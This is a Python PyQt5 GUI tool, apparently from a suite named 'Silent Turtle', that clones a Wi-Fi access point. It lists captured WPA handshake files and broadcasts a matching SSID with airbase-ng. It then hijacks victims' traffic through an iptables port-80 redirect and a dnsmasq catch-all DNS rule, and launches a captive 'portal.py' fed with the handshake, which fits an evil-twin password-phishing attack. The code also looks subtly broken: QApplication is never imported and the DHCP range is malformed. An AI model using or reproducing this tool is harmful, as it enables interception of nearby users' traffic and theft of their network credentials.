# cloneap.py
#!/usr/bin/env python3
import os
import re
import sys
import time
import subprocess
from PyQt5.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel,
    QListWidget, QPushButton, QLineEdit, QSpinBox,
    QTextEdit, QMessageBox, QFileDialog
)
from PyQt5.QtCore import Qt, QProcess, QSettings
from PyQt5.QtGui import QFont

def ensure_root():
    if os.geteuid() != 0:
        QMessageBox.critical(None, "Root Required", "Run as root to clone AP.")
        sys.exit(1)

def find_monitor_interfaces():
    try:
        out = subprocess.check_output(["iw", "dev"], stderr=subprocess.DEVNULL).decode()
    except subprocess.CalledProcessError:
        return []
    mons, cur = [], None
    for line in out.splitlines():
        if line.strip().startswith("Interface"):
            cur = line.split()[1]
        if cur and "type monitor" in line:
            mons.append(cur)
            cur = None
    return mons

def parse_handshake_filename(fname):
    base = os.path.splitext(fname)[0]
    m = re.match(
        r'^(?P<ssid>.+?)_[0-9A-Fa-f]{2}(?:-[0-9A-Fa-f]{2}){5}_\d{4}',
        base
    )
    return m.group('ssid') if m else base

def sanitize_ssid(raw):
    ssid = re.sub(r'[^A-Za-z0-9 \-_]', '', raw)
    return ssid.strip()[:32]

class CloneAPWidget(QWidget):
    AT0_IP     = "10.0.0.1/24"
    DHCP_RANGE = "10.0.0.50,10.0.150,12h"

    def __init__(self):
        super().__init__()
        ensure_root()

        # persist last dir & SSID
        self.settings = QSettings('SilentTurtle', 'CloneAP')
        self.HANDSHAKE_DIR = self.settings.value('handshakeDir', './handshakes')
        self.selected_raw_ssid = None

        self.iface = None
        self.process = None
        self.handshakes = {}

        self._build_ui()
        self._detect_iface()
        self._load_handshakes()

        # restore last SSID input
        last = self.settings.value('selectedRawSsid', '')
        if last:
            self.ssid_input.setText(last)
        self._update_start_btn()

    def _build_ui(self):
        self.setWindowTitle("🔌 Silent Turtle: Clone AP")
        self.setStyleSheet("background:#001100;color:#00ff00;font-family:Consolas,monospace;")
        L = QVBoxLayout(self)
        L.setContentsMargins(12,12,12,12)
        L.setSpacing(8)

        title = QLabel("Clone AP")
        title.setFont(QFont("Consolas", 20, QFont.Bold))
        title.setAlignment(Qt.AlignCenter)
        L.addWidget(title)

        # Handshake dir chooser
        hdir = QHBoxLayout()
        hdir.addWidget(QLabel("Handshake Dir:"))
        self.dir_disp = QLineEdit(self.HANDSHAKE_DIR)
        self.dir_disp.setReadOnly(True)
        btn_dir = QPushButton("Change…")
        btn_dir.clicked.connect(self._change_dir)
        hdir.addWidget(self.dir_disp)
        hdir.addWidget(btn_dir)
        L.addLayout(hdir)

        btn_refresh = QPushButton("Refresh SSIDs")
        btn_refresh.clicked.connect(self._load_handshakes)
        L.addWidget(btn_refresh)

        # optional handshake list
        self.ssid_list = QListWidget()
        self.ssid_list.itemClicked.connect(self._ssid_selected)
        L.addWidget(self.ssid_list, stretch=1)

        # custom SSID input
        man = QHBoxLayout()
        man.addWidget(QLabel("Or New SSID:"))
        self.ssid_input = QLineEdit()
        self.ssid_input.textChanged.connect(self._update_start_btn)
        man.addWidget(self.ssid_input)
        L.addLayout(man)

        # interface display
        ifc = QHBoxLayout()
        ifc.addWidget(QLabel("Interface:"))
        self.iface_disp = QLineEdit("Detecting…")
        self.iface_disp.setReadOnly(True)
        ifc.addWidget(self.iface_disp)
        L.addLayout(ifc)

        # channel selector
        ch = QHBoxLayout()
        ch.addWidget(QLabel("Channel:"))
        self.chan = QSpinBox()
        self.chan.setRange(1, 14)
        self.chan.setValue(6)
        ch.addWidget(self.chan)
        L.addLayout(ch)

        # start/stop
        hb = QHBoxLayout()
        self.btn_start = QPushButton("Start Clone")
        self.btn_start.clicked.connect(self._start_clone)
        self.btn_stop  = QPushButton("Stop Clone")
        self.btn_stop.clicked.connect(self._stop_clone)
        self.btn_stop.setEnabled(False)
        hb.addWidget(self.btn_start)
        hb.addWidget(self.btn_stop)
        L.addLayout(hb)

        # log area
        self.log = QTextEdit()
        self.log.setReadOnly(True)
        self.log.setStyleSheet("background:#000a00;")
        L.addWidget(self.log, stretch=2)

    def _change_dir(self):
        d = QFileDialog.getExistingDirectory(self, "Select Handshake Directory", self.HANDSHAKE_DIR)
        if d:
            self.HANDSHAKE_DIR = d
            self.dir_disp.setText(d)
            self.settings.setValue('handshakeDir', d)
            self._load_handshakes()
            self._update_start_btn()

    def _load_handshakes(self):
        self.ssid_list.clear()
        self.handshakes.clear()
        try:
            for f in os.listdir(self.HANDSHAKE_DIR):
                if f.lower().endswith((".cap", ".pcap", ".pcapng")):
                    ss = parse_handshake_filename(f)
                    path = os.path.join(self.HANDSHAKE_DIR, f)
                    if ss not in self.handshakes:
                        self.handshakes[ss] = path
                        self.ssid_list.addItem(ss)
            self.log.append(f"✓ Loaded {len(self.handshakes)} handshake(s)")
        except Exception as e:
            QMessageBox.critical(self, "Load Error", str(e))
        self._update_start_btn()

    def _ssid_selected(self, itm):
        self.selected_raw_ssid = itm.text()
        self.ssid_input.setText(itm.text())
        self.settings.setValue('selectedRawSsid', itm.text())
        self.log.append(f"Selected handshake for SSID: {itm.text()}")
        self._update_start_btn()

    def _detect_iface(self):
        mons = find_monitor_interfaces()
        if mons:
            self.iface = mons[0]
            self.iface_disp.setText(self.iface)
            self.log.append(f"✓ Detected iface: {self.iface}")
        else:
            self.iface = None
            self.iface_disp.setText("None")
            QMessageBox.critical(self, "Iface Error", "No monitor-mode interface found.")
        self._update_start_btn()

    def _update_start_btn(self):
        ok = bool(self.iface) and bool(self.ssid_input.text().strip())
        self.btn_start.setEnabled(ok)

    def _start_clone(self):
        raw = self.ssid_input.text().strip()
        ssid = sanitize_ssid(raw)
        ch   = str(self.chan.value())
        hs   = self.handshakes.get(self.selected_raw_ssid, "")

        cmd = ["airbase-ng", "-e", ssid, "-c", ch, self.iface]
        self.log.append(f"▶ {' '.join(cmd)}")

        self.process = QProcess(self)
        self.process.readyReadStandardOutput.connect(lambda:
            self.log.append(self.process.readAllStandardOutput().data().decode(errors='ignore'))
        )
        self.process.readyReadStandardError.connect(lambda:
            self.log.append(f"<span style='color:red;'>{self.process.readAllStandardError().data().decode(errors='ignore')}</span>")
        )
        self.process.start(cmd[0], cmd[1:])
        if not self.process.waitForStarted(3000):
            self.log.append("⚠️ airbase-ng failed to start")
            return

        self.log.append("Waiting up to 5s for at0…")
        for _ in range(10):
            if os.path.isdir("/sys/class/net/at0"):
                break
            time.sleep(0.5)
        else:
            self.log.append("⚠️ at0 never appeared")
            return

        self._setup_captive()

        subprocess.Popen([sys.executable, "portal.py", hs, ssid])
        if hs:
            self.log.append(f"✓ Launched portal.py with handshake {hs} and SSID {ssid}")
        else:
            self.log.append(f"✓ Launched portal.py (no handshake) with SSID {ssid}")

        self.btn_start.setEnabled(False)
        self.btn_stop.setEnabled(True)

    def _stop_clone(self):
        if self.process:
            self.process.kill()
            self.log.append("■ Clone stopped")
            self.process = None
        self.btn_start.setEnabled(True)
        self.btn_stop.setEnabled(False)

    def _setup_captive(self):
        subprocess.run(["ip", "addr", "add", self.AT0_IP, "dev", "at0"], check=False)
        subprocess.run(["ip", "link", "set", "dev", "at0", "up"], check=False)
        self.log.append(f"✓ at0 set to {self.AT0_IP}")

        subprocess.run([
            "iptables", "-t", "nat", "-A", "PREROUTING", "-i", "at0",
            "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "8080"
        ], check=False)

        ip, _ = self.AT0_IP.split("/")
        conf = (
            f"interface=at0\n"
            f"bind-interfaces\n"
            f"dhcp-range={self.DHCP_RANGE}\n"
            f"address=/#/{ip}\n"
        )
        cfg = "/tmp/dnsmasq_captive.conf"
        with open(cfg, "w") as f:
            f.write(conf)

        subprocess.run(["pkill", "-f", cfg], check=False)
        subprocess.Popen(["dnsmasq", "--conf-file="+cfg])
        self.log.append("✓ dnsmasq DHCP+DNS started")


def main():
    app = QApplication(sys.argv)
    w = CloneAPWidget()
    w.show()
    sys.exit(app.exec_())


if __name__=="__main__":
    main()
